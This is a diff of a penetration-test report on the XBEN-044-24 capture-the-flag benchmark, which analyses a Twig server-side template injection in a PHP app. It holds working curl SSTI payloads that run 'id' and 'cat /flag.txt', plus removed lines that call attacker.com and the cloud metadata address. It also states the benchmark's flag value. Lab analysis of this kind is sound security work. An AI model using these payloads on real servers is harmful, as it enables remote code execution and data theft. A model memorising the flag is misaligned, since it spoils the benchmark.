-- **Storage:** Inside container at `/var/log/apache2/` (ephemeral - lost on container restart)
-- **Rotation:** Not configured
-- **Retention:** Unlimited until container destroyed
-
-**Security Event Visibility:**
-
-What is logged:
-- ✅ HTTP requests (IP, timestamp, method, path, status code)
-- ✅ User agents and referrers
-- ✅ Apache errors and PHP errors
-- ✅ POST parameters may appear in access logs
-
-What is NOT logged:
-- ❌ Authentication events (no auth system exists)
-- ❌ Authorization failures (no authorization system exists)
-- ❌ SSTI exploitation attempts (no template injection detection)
-- ❌ File access attempts
-- ❌ Successful RCE executions
-- ❌ Data exfiltration
-- ❌ Command execution via SSTI
-
-**Monitoring Infrastructure:** NONE
-
-- No SIEM (Security Information and Event Management)
-- No centralized logging
-- No alerting system
-- No anomaly detection
-- No intrusion detection system (IDS)
-- No intrusion prevention system (IPS)
-
-**Health Checks:**
-A basic health check is configured in `docker-compose.yml`:
-```yaml
-healthcheck:
-  test: ["CMD", "curl", "-f", "http://127.0.0.1:8080/index.php"]
-  timeout: 5s
-  retries: 5
-  interval: 5s
-```
-This only verifies HTTP availability, not security posture.
-
----
-
-## 7. Overall Codebase Indexing
-
-The XBEN-044-24 codebase demonstrates a deliberately minimalist architecture designed for CTF security training. The application consists of a single PHP entry point file (`index.php`) with 75 lines of code, leveraging the Twig template engine as its only dependency. This simplicity is intentional, focusing the attack surface on a specific vulnerability class (Server-Side Template Injection) while eliminating extraneous complexity.
-
-**Directory Structure:**
-
-```
-XBEN-044-24/
-├── .env                          # Plaintext flag storage
-├── docker-compose.yml            # Container orchestration (port mapping 8081:8080)
-├── Makefile                      # Build automation (local only, not network-accessible)
-├── benchmark.json                # CTF metadata (win condition: flag extraction)
-├── outputs/                      # Scanning results directory
-│   └── scans/                    # External recon tool outputs (nmap, whatweb, subfinder)
-└── app/                          # Application root (mapped to /var/www/html in container)
-    ├── Dockerfile                # Multi-stage container build with flag injection
-    ├── composer.json             # Single dependency: twig/twig 1.19.0
-    ├── composer.lock             # Dependency lock file
-    ├── index.php                 # **PRIMARY ATTACK SURFACE** - 75 lines, single entry point
-    ├── templates/                # Template directory
-    │   └── hello.html.twig       # Unused template with RCE proof-of-concept (not loaded)
-    ├── vendor/                   # Composer dependencies (owned by www-data)
-    │   ├── autoload.php          # PSR-0 autoloader
-    │   ├── composer/             # Composer metadata
-    │   └── twig/                 # Twig 1.19.0 framework
-    │       └── twig/
-    │           └── lib/          # 177 PHP files comprising Twig engine
-    │               ├── Twig/Autoloader.php
-    │               ├── Twig/Environment.php
-    │               ├── Twig/Loader/String.php  # **VULNERABILITY ENABLER**
-    │               ├── Twig/Extension/Sandbox.php  # Disabled at runtime
-    │               └── ... (173 additional files)
-    └── wwwconf/                  # Apache configuration
-        ├── 000-default.conf      # VirtualHost: port 8080, DocumentRoot /var/www/html
-        └── ports.conf            # Listen 8080, SSL module configuration (inactive)
+```html
+<strong>flag{af836647-517f-415a-a0a8-90b9bd2115e7} is in stock! Come back and test another one. </strong>
 ```
 
-**Build and Deployment Workflow:**
+### SINK #2: Template File with Pre-Injected SSTI Payload
 
-The application uses a multi-stage Docker build process with explicit user separation for security theater (though the sandbox removal negates this):
-1. Base image: `php:8.0-apache` (Debian 11.8 Bullseye)
-2. Create `appuser:1000` for build operations
-3. Install Composer dependencies as `appuser`
-4. Chown vendor directory to `www-data:www-data` (Apache runtime user)
-5. Inject flag: `ARG FLAG` → `RUN echo $FLAG > /flag.txt`
-6. Container exposes port 8080, mapped to host port 8081
+**Sink Type:** Template Injection / Command Execution Demonstration
 
-**Dependency Management:**
+**Render Context:** Server-Side Template Engine (Twig 1.19.0) - Template file context
 
-The application uses Composer with a PSR-0 autoloader (legacy standard, replaced by PSR-4 in modern PHP):
-- **Package Manifest:** `composer.json` (5 lines, single requirement)
-- **Lock File:** `composer.lock` (2843 bytes, pinned version)
-- **Autoloader:** `/vendor/autoload.php` (included on line 3 of `index.php`)
+**Function/Method:** Twig template variable rendering (`{{ }}` syntax in .twig file)
 
-**Code Organization Impact on Security:**
+**File Location:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/templates/hello.html.twig` - **Line 8**
 
-1. **Single File Entry Point:** All application logic in one file makes it easy to audit but creates a single point of failure. The SSTI vulnerability exists at line 56 of the only executable code file.
+**Code Context:**
 
-2. **No Code Generation:** The application has no build-time code generation, metaprogramming, or dynamic class loading beyond Composer's autoloader. This eliminates hidden code paths.
-
-3. **No Testing Framework:** No PHPUnit or testing infrastructure detected. The `vendor/twig/twig/test/` directory contains Twig framework tests, not application tests.
-
-4. **Static Template Directory:** The `templates/` directory exists but is not used by the main application flow. The vulnerable code path uses `Twig_Loader_String` (which renders inline strings) rather than `Twig_Loader_Filesystem` (which would load `.twig` files).
-
-5. **Convention Over Configuration:** Apache's default DocumentRoot behavior means `/index.php` is the default handler. No explicit routing configuration exists, simplifying discovery but providing no abstraction layer for security controls.
-
-**Discoverability of Security-Relevant Components:**
-
-The minimalist structure makes security components highly discoverable:
-- ✅ **Authentication:** None exists (obvious from single 75-line file)
-- ✅ **Input Validation:** Single `htmlspecialchars()` call on line 8
-- ✅ **Template Rendering:** Twig initialization on lines 12-24, rendering on line 56
-- ✅ **Sandbox Removal:** Explicit loop on lines 36-43
-- ✅ **Configuration:** All settings in `new Twig_Environment($loader, [...])` array
-- ✅ **Flag Storage:** Documented in Dockerfile and `.env` file
-
-**Tools and Conventions:**
-
-- **Build Tool:** `make` with targets for building and managing Docker containers
-- **Container Runtime:** Docker/Podman compatible
-- **Orchestration:** docker-compose for local development
-- **Package Manager:** Composer (PHP standard)
-- **Autoloading:** PSR-0 (legacy, but standard for Twig 1.x)
-- **Code Style:** Inconsistent (mixing old PHP style with modern array syntax)
-
-**Security Impact of Structure:**
-
-The flat, single-file architecture eliminates many attack vectors (no complex routing to bypass, no middleware chains to circumvent) but concentrates risk in the one executable code path. The vulnerability is discoverable through:
-1. Static analysis of `index.php` (Twig_Loader_String usage)
-2. Reading Dockerfile (flag storage location)
-3. Examining Twig configuration (sandbox removal)
-4. Template file inspection (`hello.html.twig` provides RCE example)
-
-This intentional design makes the challenge solvable through code review alone, though exploitation requires understanding Twig internals.
-
----
-
-## 8. Critical File Paths
-
-The following file paths are referenced throughout this analysis, organized by security relevance for manual review:
-
-### Configuration
-
-**Docker & Infrastructure:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/docker-compose.yml` - Port mapping 8081:8080, health check configuration
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/Dockerfile` - Multi-stage build, flag injection (lines 30-31), user separation
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/.env` - **SENSITIVE:** Plaintext flag storage
-
-**Web Server:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/wwwconf/000-default.conf` - Apache VirtualHost, port 8080, no security headers
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/wwwconf/ports.conf` - Listen configuration, SSL module (inactive)
-
-**CTF Metadata:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/benchmark.json` - Win condition, challenge name
-
-### Authentication & Authorization
-
-**Status:** NOT APPLICABLE - No authentication or authorization mechanisms implemented in this application.
-
-### API & Routing
-
-**Application Entry Point:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/index.php` - **PRIMARY ATTACK SURFACE**
-  - Line 8: Input sanitization (`htmlspecialchars()`)
-  - Line 12: Twig_Loader_String initialization (**VULNERABILITY ENABLER**)
-  - Lines 16-24: Twig environment configuration (debug mode, sandbox settings)
-  - Lines 40-42: Explicit sandbox removal (**CRITICAL VULNERABILITY**)
-  - Line 56: Template rendering with user input (**SSTI VULNERABILITY**)
-  - Lines 68-71: HTML form definition
-
-**Template Files:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/templates/hello.html.twig` - RCE proof-of-concept (line 8), **NOT loaded by application**
-
-### Data Models & DB Interaction
-
-**Status:** NOT APPLICABLE - No database connections or data models implemented in this application.
-
-### Dependency Manifests
-
-**Package Management:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/composer.json` - Single dependency: `twig/twig: 1.19.0`
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/composer.lock` - Dependency lock file with version pinning
-
-**Autoloader:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/autoload.php` - Composer PSR-0 autoloader
-
-### Sensitive Data & Secrets Handling
-
-**Flag Storage (CRITICAL):**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/.env` - Plaintext flag (line 1)
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/Dockerfile` - Flag injection via build ARG (lines 30-31)
-- `/flag.txt` (inside container) - Runtime flag storage, world-readable
-
-**Encryption/Secrets:**
-- **Status:** NOT APPLICABLE - No encryption or secret management mechanisms implemented
-
-### Middleware & Input Validation
-
-**Input Sanitization:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/index.php` 
-  - Line 8: `htmlspecialchars()` application (**INSUFFICIENT for SSTI prevention**)
-
-**Template Security:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Loader/String.php` - Deprecated loader (treats input as template source)
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Extension/Sandbox.php` - Sandbox extension (removed at runtime)
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Environment.php` - Template engine core (lines 266, 332, 363)
-
-### Logging & Monitoring
-
-**Web Server Logs:**
-- `${APACHE_LOG_DIR}/access.log` (inside container) - HTTP access logs, combined format
-- `${APACHE_LOG_DIR}/error.log` (inside container) - Apache/PHP error logs
-
-**Application Logging:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/index.php` - Line 17: Debug mode enabled (`'debug' => true`)
-
-### Infrastructure & Deployment
-
-**Build/Deployment:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/Makefile` - Build automation (local only, not network-accessible)
-
-**Network Configuration:**
-- No Nginx, Kubernetes Ingress, or gateway configurations detected
-
-### CTF Flag Storage (High-Value Intelligence)
-
-**Flag Locations (All Plaintext):**
-1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/.env` - Source of truth, line 1
-2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/Dockerfile` - Build-time injection, lines 30-31
-3. `/flag.txt` (container filesystem) - Runtime storage, accessible via RCE
-4. Docker image history - Flag visible in build layers
-
-**Flag Value:** `flag{af836647-517f-415a-a0a8-90b9bd2115e7}`
-
----
-
-## 9. XSS Sinks and Render Contexts
-
-### Network Surface Focus
-
-This section catalogs XSS and injection sinks found **only in network-accessible components** (the main application endpoint `/index.php`). Excluded are vendor test files, build scripts, and the unused template file.
-
-### Template Injection Sinks (Server-Side Template Injection - SSTI)
-
-#### SINK #1: PRIMARY SSTI VULNERABILITY - Twig String Rendering with User Input
-
-**Severity:** ⚠️ **CRITICAL** - Enables Remote Code Execution (RCE)
-
-**Location:**
-- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/index.php`
-- **Line:** 56
-- **Context:** POST request handler
-
-**Vulnerable Code:**
-```php
-echo $twig->render('<strong>' .  $name . ' is in stock! Come back and test another one. </strong>') . '<br/>Twig version: ' . $twig->render($twigVersion);
+```twig
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hello</title>
+</head>
+<body>
+    <h1>Hello, {{name}}!</h1>
+    <h4>Current user:{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}!</h4>
+    <p>Sandbox mode: {{ sandboxEnabled ? 'Enabled' : 'Disabled' }}</p>
+    <p>Twig version: {{ twigVersion }}</p>
+</body>
+</html>
 ```
 
-**Vulnerability Details:**
+**User Input Source:** Template variables passed to Twig rendering (if this template were actively used)
 
-**Sink Type:** Server-Side Template Injection (SSTI) via `Twig_Environment::render()`
+**Critical Line (Line 8):**
 
-**Render Context:** Template string context - User input is treated as executable Twig template source code
-
-**User Input Source:**
-- **Parameter:** `$_POST['name']` (line 8)
-- **Data Flow:**
-  ```
-  POST parameter 'name' 
-      ↓
-  isset() check (line 8)
-      ↓
-  htmlspecialchars() sanitization (line 8)
-      ↓
-  String concatenation into template (line 56)
-      ↓
-  Twig_Loader_String::getSource()
-      ↓
-  Twig_Environment::render() [EVALUATES EXPRESSIONS]
-      ↓
-  Remote Code Execution
-  ```
-
-**Sanitization Applied:** `htmlspecialchars()` on line 8
-- Encodes: `<`, `>`, `&`, `"`, `'`
-- **Does NOT encode:** `{{`, `}}`, `{%`, `%}`, `_self`, `.env`, `()`, `[]`
-
-**Sanitization Bypass Mechanism:**
-The `htmlspecialchars()` function is designed to prevent HTML injection (XSS) by encoding HTML special characters. However:
-1. Twig template syntax (`{{`, `}}`) is not HTML and passes through unchanged
-2. The sanitized input is then concatenated into a string passed to `Twig_Loader_String`
-3. `Twig_Loader_String` interprets the entire string as template source code, not as data
-4. Twig evaluates expressions like `{{7*7}}` or `{{_self.env.getFilter("system")}}` as executable code
-
-**Critical Configuration Issues:**
-- **Line 12:** Uses deprecated `Twig_Loader_String()` - treats input as template source
-- **Line 22:** `'autoescape' => 'html'` - Only escapes HTML output, not template syntax
-- **Lines 40-42:** Sandbox extension explicitly removed if present
-- **Line 23:** `'optimizations' => 0'` - Disables security optimizations
-- **Line 21:** `'strict_variables' => false'` - Allows undefined variable access
-
-**Exploitability:** ✅ **DIRECT** - Fully exploitable without additional conditions
-
-**Proof of Concept Payloads:**
-
-1. **Template Evaluation Test:**
-   ```bash
-   curl -X POST http://localhost:8081/index.php -d "name={{7*7}}"
-   # Expected output: "49 is in stock!"
-   ```
-
-2. **Environment Disclosure:**
-   ```bash
-   curl -X POST http://localhost:8081/index.php -d "name={{_self.env.getGlobals()}}"
-   # Expected: Twig global variables and configuration
-   ```
-
-3. **Remote Code Execution - Command Execution:**
-   ```bash
-   curl -X POST http://localhost:8081/index.php -d "name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
-   # Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
-   ```
-
-4. **Flag Extraction:**
-   ```bash
-   curl -X POST http://localhost:8081/index.php -d "name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag.txt')}}"
-   # Expected: flag{af836647-517f-415a-a0a8-90b9bd2115e7}
-   ```
-
-**Attack Vector Breakdown:**
-
-The exploitation technique leverages Twig's internal methods:
-1. `_self` - References the current template object
-2. `_self.env` - Accesses the Twig_Environment instance
-3. `registerUndefinedFilterCallback("system")` - Registers PHP's `system()` function as a filter callback
-4. `getFilter("cat /flag.txt")` - Invokes the registered filter with the command as an argument
-5. The `system()` function executes the shell command and outputs the result
-
-**Impact:**
-- ✅ Remote Code Execution as `www-data` user
-- ✅ File system read access (can read `/flag.txt`)
-- ✅ Command execution (can run arbitrary shell commands)
-- ✅ Flag extraction (primary CTF objective)
-- ✅ Potential container escape (if kernel vulnerabilities exist)
-
----
-
-### Client-Side XSS Sinks
-
-**Finding:** ❌ **No client-side XSS sinks found in network-accessible components**
-
-**Analysis Performed:**
-- ✅ Searched for JavaScript files: None found in `/app/` directory
-- ✅ Searched for DOM manipulation: No `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`
-- ✅ Searched for inline JavaScript: No `<script>` tags with user-controlled content
-- ✅ Searched for event handlers: No `onclick`, `onerror`, `onload` with user input
-
-**HTML Output:** 
-The application generates HTML output server-side via PHP `echo` statements (lines 56-75). While `htmlspecialchars()` would normally prevent reflected XSS, the SSTI vulnerability allows injecting arbitrary HTML/JavaScript through template expressions:
-
-```bash
-# Inject JavaScript via SSTI
-curl -X POST http://localhost:8081/index.php -d "name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('echo <script>alert(1)</script>')}}"
-```
-
-This achieves the same result as client-side XSS (JavaScript execution in browser) but via server-side template injection.
-
----
-
-### SQL Injection Sinks
-
-**Finding:** ❌ **No SQL injection sinks found in network-accessible components**
-
-**Analysis Performed:**
-- ✅ Searched for database functions: No `mysqli`, `PDO`, `mysql_query`, `pg_query`, `sqlite_query`
-- ✅ Searched for SQL keywords: No `SELECT`, `INSERT`, `UPDATE`, `DELETE` in application code
-- ✅ Checked Dockerfile: `pdo_mysql` extension installed (line 9) but unused
-- ✅ Verified: No database connection code in `/app/index.php`
-
-**Note:** While the `pdo_mysql` extension is present, it could only be exploited via RCE through the SSTI vulnerability.
-
----
-
-### Command Injection Sinks
-
-**Finding:** ❌ **No direct command injection sinks found in network-accessible components**
-
-**Analysis Performed:**
-- ✅ Searched for: `exec()`, `shell_exec()`, `system()`, `passthru()`, `proc_open()`, `popen()`, `pcntl_exec()`
-- ✅ Result: None found in `/app/index.php`
-- ✅ Backtick operator: Not used in application code
-
-**Indirect Command Execution:**
-Command injection is achievable **only via the SSTI vulnerability** using the technique documented in SINK #1. The SSTI vulnerability allows registering PHP command execution functions as Twig filter callbacks.
-
----
-
-### Other Injection Sinks
-
-**Finding:** ❌ **No other injection sinks found**
-
-Categories analyzed:
-- ❌ **LDAP Injection:** No LDAP functions (`ldap_*`)
-- ❌ **XML Injection:** No XML parsers with user input (`simplexml_*`, `DOMDocument`)
-- ❌ **XPath Injection:** No XPath queries
-- ❌ **CSV Injection:** No CSV generation
-- ❌ **Log Injection:** Logs are Apache-managed (not manipulated by application code)
-- ❌ **Header Injection:** No `header()` calls with user input
-
----
-
-### Summary Table: XSS & Injection Sinks
-
-| Sink ID | Type | Location | Line | Severity | Exploitability | Impact |
-|---------|------|----------|------|----------|----------------|--------|
-| **SINK-1** | SSTI | `/app/index.php` | 56 | CRITICAL | DIRECT | RCE, Flag Extraction |
-| N/A | Client-Side XSS | N/A | N/A | N/A | N/A | None Found |
-| N/A | SQL Injection | N/A | N/A | N/A | N/A | None Found |
-| N/A | Command Injection (Direct) | N/A | N/A | N/A | N/A | None Found |
-
-**Total Network-Accessible Sinks:** 1 (Server-Side Template Injection)
-
----
-
-### Unused Template with RCE Payload (Out of Scope)
-
-**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/templates/hello.html.twig`
-**Line:** 8
-**Status:** ⚠️ **NOT LOADED** by the application (commented out on line 11 of `index.php`)
-
-**Content:**
 ```twig
 <h4>Current user:{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}!</h4>
 ```
 
-**Analysis:**
-This template file contains a proof-of-concept RCE payload demonstrating the SSTI exploitation technique. However, it is **not part of the network-accessible attack surface** because:
-1. The main application uses `Twig_Loader_String` (renders inline strings)
-2. No code path loads templates from the `templates/` directory
-3. Line 11 of `index.php` that would load this template is commented out
+**Exploitation Technique Demonstrated:**
 
-**Purpose:** Serves as exploitation guidance for penetration testers.
+1. `_self` - Accesses the current Twig template object from within the template
+2. `.env` - Retrieves the Twig Environment object
+3. `.registerUndefinedFilterCallback("exec")` - Registers PHP's `exec()` function as a Twig filter callback handler
+4. `.getFilter("id")` - Calls the registered filter with "id" as an argument, executing `exec("id")` on the server
+5. The output of the `id` command is rendered in the HTML response
 
----
+**Important Note:** This template is **NOT actively rendered** by the current application code. Line 52 of `index.php` is commented out:
 
-## 10. SSRF Sinks
-
-### Network Surface Focus
-
-This section catalogs Server-Side Request Forgery (SSRF) sinks found **only in network-accessible components** (the main application endpoint `/index.php`). Excluded are vendor libraries, test files, build scripts, and local-only utilities.
-
-### Finding: No SSRF Sinks Detected
-
-After comprehensive analysis of all network-accessible application code, **NO SSRF vulnerabilities were found**.
-
----
-
-### Analysis Methodology
-
-The following SSRF sink categories were systematically searched across all application code (excluding vendor libraries):
-
-#### 1. HTTP(S) Clients
-**Searched For:**
-- `curl_init()`, `curl_exec()`, `curl_setopt()`, `curl_setopt_array()`
-- `file_get_contents()` with URLs
-- `fopen()` with URLs  
-- `fsockopen()`, `pfsockopen()`
-- Guzzle HTTP client, HTTPlug, or other HTTP libraries
-
-**Result:** ❌ None found in `/app/index.php`
-
-#### 2. URL Openers & File Includes
-**Searched For:**
-- `readfile($url)`
-- `file($url)`
-- `include()`, `require()`, `include_once()`, `require_once()` with variables
-- `stream_context_create()` with URLs
-- `socket_create()`, `socket_connect()`
-
-**Result:** ❌ None found (only one static include on line 3: `include 'vendor/twig/twig/lib/Twig/Autoloader.php';`)
-
-**Static Include Analysis:**
 ```php
-// Line 3 of /app/index.php
-include 'vendor/twig/twig/lib/Twig/Autoloader.php';
-```
-- **User Control:** NONE - Hardcoded path
-- **SSRF Risk:** None - No user input influences include path
-
-#### 3. XML/External Entity Processing
-**Searched For:**
-- `simplexml_load_*()` functions
-- `DOMDocument::load*()` methods
-- `XMLReader` with external sources
-- `libxml_disable_entity_loader()`
-
-**Result:** ❌ None found in application code
-
-#### 4. Redirect & Location Headers
-**Searched For:**
-- `header("Location: ...")`
-- `header("Refresh: ...")`
-- Meta refresh tags
-
-**Result:** ❌ None found - No redirect functionality
-
-#### 5. Image/Media Processors
-**Searched For:**
-- ImageMagick functions (`imagick_*`)
-- GD library functions (`imagecreatefrom*`, `getimagesize`)
-- PDF generators with URL inputs
-- Media conversion tools
-
-**Result:** ❌ None found - No image processing
-
-#### 6. API/Webhook Callers
-**Searched For:**
-- Webhook notification systems
-- External API integration code
-- Payment gateway calls
-- Third-party service clients
-
-**Result:** ❌ None found - No external API calls
-
-#### 7. Template/View Fetchers
-**Searched For:**
-- Remote template loading (e.g., `Twig_Loader_Filesystem` with URLs)
-- External view includes
-- Asset fetchers from remote sources
-
-**Result:** ❌ Application uses `Twig_Loader_String` (renders inline strings, no file/URL access)
-
-**Important Note:** While the application uses `Twig_Loader_String`, this loader does NOT perform network requests or file system access. It renders the string directly as a template. The SSTI vulnerability allows RCE, but not SSRF.
-
-#### 8. DNS Lookups
-**Searched For:**
-- `gethostbyname()`, `gethostbynamel()`
-- `dns_get_record()`, `dns_get_mx()`
-- Custom DNS resolution code
-
-**Result:** ❌ None found in application code
-
----
-
-### Template Engine Internal Analysis
-
-**Twig_Loader_String vs. Twig_Loader_Filesystem:**
-
-**Current Loader (in use):**
-- **File:** `/app/vendor/twig/twig/lib/Twig/Loader/String.php`
-- **Method:** `getSource($name)` - Returns the string directly
-- **Network Access:** None - No HTTP requests or file operations
-- **SSRF Risk:** None from this loader
-
-**Alternative Loader (not used):**
-- **File:** `/app/vendor/twig/twig/lib/Twig/Loader/Filesystem.php`
-- **Method:** `getSource($name)` - Uses `file_get_contents()` internally (line 130)
-- **Network Access:** Potentially yes if configured with URL wrappers
-- **Status:** NOT USED in this application
-
-**Twig Built-in Functions:**
-
-The `source()` Twig function (available in `Twig_Extension_Core.php` line 1458) can read files:
-```php
-// In Twig_Extension_Core.php:1458
-public function twig_source(Twig_Environment $env, $name) {
-    return $env->getLoader()->getSource($name);
-}
+// Line 52 (commented out):
+// echo $twig->render('hello.html.twig', ['name' => $name, 'twigVersion' => $twigVersion, 'sandboxEnabled' => $sandboxEnabled]);
 ```
 
-**Analysis:**
-- With `Twig_Loader_Filesystem`, this could read arbitrary files
-- With `Twig_Loader_String` (current), this function is not useful for SSRF
-- **Status:** Function not exposed or called in application templates
+However, this template demonstrates a **working SSTI payload** that shows how the Twig environment can be manipulated to achieve remote code execution when the Sandbox extension is removed.
 
----
+**Scope Status:** **OUT-OF-SCOPE for active exploitation** (template not rendered by current code flow) but **IN-SCOPE for security analysis** as it demonstrates the intended vulnerability
 
-### Potential SSRF via RCE (Indirect)
+**Severity:** **CRITICAL (if template were actively rendered)** - Demonstrates RCE technique
 
-**Important Clarification:**
-While the application has **no direct SSRF sinks**, an attacker who achieves RCE through the SSTI vulnerability could:
+### Additional HTML Output Sink (NOT Vulnerable to Traditional XSS)
 
-1. Execute `curl` or `wget` commands:
-   ```bash
-   POST /index.php
-   name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("curl http://attacker.com/")}}
-   ```
+**Sink Type:** HTML Echo Statement
 
-2. Use PHP's `file_get_contents()` via RCE:
-   ```bash
-   POST /index.php
-   name={{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("http://169.254.169.254/latest/meta-data/")}}
-   ```
+**Render Context:** HTML Body Context (server-side echo)
 
-However, this is **RCE with SSRF capability**, not an **SSRF vulnerability**. The distinction is important:
-- **SSRF Sink:** Application code that performs server-side requests influenced by user input
-- **RCE → SSRF:** Using command execution to make requests (requires RCE first)
+**File Location:** `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` - **Line 56**
 
-**For this report, we classify this as RCE/SSTI, not SSRF.**
-
----
-
-### File Inclusion Analysis
-
-**Include/Require Statements Found:**
 ```php
-// Line 3 of /app/index.php
-include 'vendor/twig/twig/lib/Twig/Autoloader.php';
+echo $twig->render('<strong>' .  $name . ' is in stock! Come back and test another one. </strong>');
 ```
 
 **Security Assessment:**
-- **Type:** Static include
-- **Path:** Hardcoded string literal
-- **User Control:** None
-- **Local File Inclusion (LFI) Risk:** None
-- **Remote File Inclusion (RFI) Risk:** None
 
-**PHP Configuration:**
-- `allow_url_include` status: Not configured in application (defaults to OFF in PHP 8.0)
-- `allow_url_fopen` status: Not configured (defaults to ON, but no URL fopen calls exist)
+While this is an `echo` statement that outputs HTML, it is **NOT vulnerable to traditional client-side XSS** because:
 
----
+1. The `$name` variable has been passed through `htmlspecialchars()` at line 8
+2. HTML metacharacters (`<`, `>`, `&`, `"`, `'`) are properly escaped for HTML context
+3. An attacker cannot inject malicious HTML tags like `<script>alert(1)</script>` because the brackets would be encoded as `&lt;script&gt;`
 
-### Summary Table: SSRF Sink Analysis
+However, this sink is still **CRITICALLY VULNERABLE to Server-Side Template Injection** because:
 
-| Category | Functions Searched | Result | Risk Level |
-|----------|-------------------|--------|------------|
-| HTTP(S) Clients | `curl_*`, `file_get_contents`, `fopen` | ❌ Not Found | None |
-| File Inclusion | `include`, `require` + variables | ❌ Only static include | None |
-| XML Parsers | `simplexml_*`, `DOMDocument` | ❌ Not Found | None |
-| Redirects | `header("Location:")` | ❌ Not Found | None |
-| Image Processing | ImageMagick, GD functions | ❌ Not Found | None |
-| API/Webhooks | HTTP client libraries | ❌ Not Found | None |
-| Template Loaders | Twig file/URL loading | ❌ Uses String loader only | None |
-| DNS Lookups | `gethostbyname`, `dns_*` | ❌ Not Found | None |
+1. Twig syntax (`{{ }}`) is not escaped by `htmlspecialchars()`
+2. The `$name` variable is concatenated into a Twig template string, making the template structure itself user-controllable
+3. Twig executes the template before the HTML is sent to the browser, allowing server-side code execution
 
----
+This is a critical distinction: the vulnerability occurs during server-side template rendering, not during client-side HTML parsing.
 
-### Application Data Flow (No SSRF Paths)
+### Summary: XSS vs. SSTI Classification
 
-**Complete Request Flow:**
-```
-User Input (POST 'name')
-    ↓
-isset() check
-    ↓
-htmlspecialchars() sanitization
-    ↓
-String concatenation
-    ↓
-Twig_Loader_String rendering (NO NETWORK REQUESTS)
-    ↓
-HTML output to user
-```
+**Traditional XSS Sinks Found:** NONE
 
-**No Outbound Network Requests Detected**
+The application does NOT contain traditional client-side XSS vulnerabilities where malicious JavaScript is executed in the victim's browser. The `htmlspecialchars()` function properly prevents HTML injection attacks.
 
----
+**Server-Side Template Injection Sinks Found:** TWO
 
-### File Paths Referenced (SSRF Analysis)
+1. **SINK #1 (index.php:56):** CRITICAL - Active SSTI vulnerability in production code
+2. **SINK #2 (hello.html.twig:8):** CRITICAL - Demonstrated SSTI payload (not actively rendered)
 
-**Application Files Analyzed:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/index.php` (Lines 1-76)
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/templates/hello.html.twig` (Not loaded - excluded)
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/composer.json`
+These sinks represent **Server-Side Code Execution** vulnerabilities, which are more severe than client-side XSS because they allow attackers to execute arbitrary code on the server, read sensitive files, and fully compromise the application. The exploitation occurs during template rendering on the server side, before any HTML is sent to the client's browser.
 
-**Framework Files (Reference):**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Loader/String.php`
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Loader/Filesystem.php` (Not used)
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/vendor/twig/twig/lib/Twig/Extension/Core.php` (Line 1458)
+### Network Surface Compliance
 
-**Configuration Files:**
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/docker-compose.yml`
-- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-044-24/app/wwwconf/000-default.conf`
+Both sinks are in **network-accessible components**:
 
----
+- **Sink #1:** Accessible via POST `/index.php` on port 8080 (HTTP)
+- **Sink #2:** Template file that would be network-accessible if the commented code were enabled
+
+**Excluded from this analysis:** No local-only scripts, build tools, developer utilities, or CLI applications were found with XSS/SSTI sinks.
+
+## 10. SSRF Sinks
+
+Based on comprehensive analysis of the network-accessible application code, **NO SSRF (Server-Side Request Forgery) SINKS** were identified in the application. The application is a simple PHP form handler with Twig template rendering that does not make outbound HTTP requests, open network connections, or fetch remote resources based on user input.
+
